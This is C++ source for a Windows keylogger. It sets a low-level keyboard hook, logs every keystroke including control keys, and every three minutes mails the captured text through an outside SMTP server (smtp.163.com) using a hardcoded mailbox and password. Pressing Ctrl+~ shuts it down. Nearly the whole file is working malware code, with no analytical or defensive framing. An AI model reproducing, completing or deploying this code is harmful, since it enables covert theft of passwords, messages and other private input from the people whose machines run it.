#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#include <windows.h>
#include <ctime>
#include <fstream>
#include <sstream>
#include <iostream>
#include "mail.h"
#include "ProcessTrace.h"
#pragma comment(lib,"ws2_32.lib")
using namespace std;

#define   _WIN32_WINNT  0x0500 
bool Control;
bool shouldend = false;
HHOOK MyHook;
string HookData;
char HostName[100];
bool Entered;
int lasttime;
HOSTENT * LocalHost;
int CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam3);
ostringstream sout;

void SendHookMail();

void EndProgram()
{
	SendHookMail();
	exit(0);
}

void SendHookMail()
{

	HookData = sout.str();
	SendEmail("smtp.163.com", "myhookmail@163.com", "abcdefg", "myhookmail@163.com", HookData);
	sout.flush();
}

int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 0), &wsa);

	gethostname(HostName, sizeof(HostName));
	LocalHost = gethostbyname(HostName);
	in_addr* addr = (in_addr*)*LocalHost->h_addr_list;
	IPCnt = LocalHost->h_length;
	for (int i = 0; i < IPCnt; i++)
	{
		IpAddr[i] = inet_ntoa(addr[i]);
	}
	MyHook = SetWindowsHookEx(WH_KEYBOARD_LL,
		(HOOKPROC)&KeyboardProc,
		GetModuleHandle(NULL),
		NULL);
	MSG msg;
	while (!GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	UnhookWindowsHookEx(MyHook);
	return 0;
}

int CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	if (time(0) - lasttime >= 180 && Entered)
	{
		SendHookMail();
		Entered = false;
	}
	if (!Entered)
	{
		Entered = true;
		lasttime = time(0);
	}
	if (shouldend)
	{
		UnhookWindowsHookEx(MyHook);
		EndProgram();
	}
	if (wParam == WM_KEYDOWN)
	{
		int code = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
		switch (code)
		{
		case 160:
		case VK_SHIFT:
			sout <<"[Shift]";
			break;
		case VK_DOWN:
			sout << "[DOWN]";
			break;
		case VK_UP:
			sout << "[UP]";
			break;
		case VK_LEFT:
			sout << "[LEFT]";
			break;
		case VK_RIGHT:
			sout << "[RIGHT]";
			break;
		case VK_OEM_PERIOD:
			sout <<".";
			break;
		case VK_OEM_1:
			sout <<";";
			break;
		case VK_OEM_2:
			sout <<"/";
			break;
		case VK_OEM_3:
			sout <<"~";
			if (Control)
				shouldend = true;
			break;
		case VK_OEM_4:
			sout <<"[";
			break;
		case VK_OEM_5:
			sout <<"\\";
			break;
		case VK_OEM_6:
			sout <<"]";
			break;
		case VK_OEM_7:
			sout <<"'";
			break;
		case VK_OEM_COMMA:
			sout <<",";
			break;
		case VK_OEM_PLUS:
			sout <<"+";
			break;
		case VK_OEM_MINUS:
			sout <<"-";
			break;
		case 9:
			sout <<"\\t";
			break;
		case VK_BACK:
			sout <<"[Delete]";
			break;
		case VK_RETURN:
			sout <<"[Enter]";
			break;
		case VK_CONTROL:
		case 162:
			Control = true;
			sout <<"[Control]";
			break;
		case VK_ESCAPE:
			sout <<"[ESC]";
			break;
		case 91:
			sout <<"[HOME]";
			break;
		case 20:
			sout <<"[CAPS LOCK]";
			break;
		case VK_ADD:
			sout << "+";
			break;
		case VK_SUBTRACT:
			sout << "-";
			break;
		case VK_MULTIPLY:
			sout << "*";
			break;
		case VK_DECIMAL:
			sout << ".";
			break;
		case VK_DIVIDE:
			sout << "/";
			break;
		case 0x21:
			sout << "[PAGE UP]";
			break;
		case 0x22:
			sout << "[PAGE DOWN]";
			break;
		default:
			if (code > 111 && code < 124)
				sout << "[F" << code - 111 << "]";
			if (code >= 0x60 && code <= 0x69)
				sout << (int)(code - 0x60);
			else
				sout << (char)code;
		}
	}
	if (wParam == WM_KEYUP && (((KBDLLHOOKSTRUCT*)lParam)->vkCode == VK_CONTROL || ((KBDLLHOOKSTRUCT*)lParam)->vkCode == 162))
		Control = false;
	return CallNextHookEx(MyHook, nCode, wParam, lParam);
}